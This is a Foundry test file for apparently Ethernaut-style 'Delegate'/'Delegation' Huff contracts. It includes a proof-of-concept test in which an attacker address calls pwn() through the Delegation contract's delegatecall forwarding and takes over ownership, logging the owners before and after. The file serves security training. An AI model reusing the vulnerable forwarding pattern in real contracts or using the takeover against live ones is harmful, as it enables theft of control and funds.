// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import {console} from "forge-std/console.sol";

import {Test} from "forge-std/Test.sol";

import {HuffDeployer} from "foundry-huff/HuffDeployer.sol";

import {IDelegate} from "src/interfaces/IDelegate.sol";
import {IDelegation} from "src/interfaces/IDelegation.sol";

contract Delegate is Test {
    address OWNER = makeAddr("Owner");
    address ATTACKER = makeAddr("Attacker");

    IDelegate delegateInterface;
    IDelegation delegationInterface;

    error CallFailed();

    function setUp() public {
        vm.startPrank(OWNER);

        address delegateAddress = HuffDeployer
            .config()
            .with_args(abi.encode(OWNER))
            .deploy("Delegate");
        delegateInterface = IDelegate(delegateAddress);

        address delegationAddress = HuffDeployer
            .config()
            .with_args(
                bytes.concat(abi.encode(OWNER), abi.encode(delegateAddress))
            )
            .deploy("Delegation");
        delegationInterface = IDelegation(delegationAddress);

        vm.stopPrank();
    }

    function test_owner() public {
        assertEq(delegateInterface.owner(), OWNER);
        assertEq(delegationInterface.owner(), OWNER);
    }

    function test_pwn() public {
        vm.prank(ATTACKER);
        delegateInterface.pwn();

        assertEq(delegateInterface.owner(), ATTACKER);
    }

    function test_PoC() public {
        console.log(
            "DELEGATE'S OWNER (BEFORE ATTACK): ",
            delegateInterface.owner()
        );
        console.log(
            "DELEGATION'S OWNER (BEFORE ATTACK): ",
            delegationInterface.owner()
        );

        vm.prank(ATTACKER);
        (bool success, ) = address(delegationInterface).call(
            abi.encodeWithSignature("pwn()")
        );
        if (!success) revert CallFailed();

        console.log(
            "DELEGATE'S OWNER (AFTER ATTACK): ",
            delegateInterface.owner()
        );
        console.log(
            "DELEGATION'S OWNER (AFTER ATTACK): ",
            delegationInterface.owner()
        );
    }
}
